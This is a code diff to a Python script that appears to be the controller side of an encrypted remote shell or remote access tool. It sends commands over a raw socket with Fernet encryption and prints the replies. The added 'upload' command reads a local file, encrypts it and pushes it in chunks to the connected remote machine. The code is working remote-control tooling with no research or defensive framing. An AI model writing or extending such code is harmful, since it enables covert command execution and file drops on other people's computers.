@@ -1,4 +1,6 @@
 import socket
+import os
+import time
 from cryptography.fernet import Fernet
 
 
@@ -10,6 +12,11 @@ def Encrypt(data):
 
 def Decrypt(data):
     return cipher.decrypt(data)
+
+def to_1024(data):
+    chunk_size = 1024
+    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
+    return chunks
 
 conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
@@ -43,6 +50,22 @@ while 1:
                     print(result.decode().strip())
                 else:
                     break
+        elif "upload" in payload:
+            conn.sendall(Encrypt(payload.encode()))
+            file_name = payload.split(" ")[1]
+            path = os.path.abspath(os.getcwd())
+            try:
+                with open(f"{path}/{file_name}","rb") as file:
+                    content = file.read()
+                    file.close()
+                content = Encrypt(content)
+                chunks = to_1024(content)
+                conn.send(Encrypt(str(len(chunks)).encode()))
+                time.sleep(1)
+                for chunk in chunks:
+                    conn.sendall(chunk)
+            except:
+                conn.send(Encrypt(b'Wrong file name'))
         else:
             conn.sendall(Encrypt(payload.encode()))
             len_chunks = Decrypt(conn.recv(1024)).decode()
